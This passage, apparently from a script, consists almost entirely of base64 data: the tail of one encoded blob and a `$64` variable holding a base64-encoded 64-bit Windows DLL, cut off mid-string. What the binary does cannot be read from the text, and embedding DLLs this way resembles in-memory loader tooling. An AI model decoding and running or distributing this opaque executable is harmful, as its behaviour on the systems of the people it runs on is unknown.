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"
    $64="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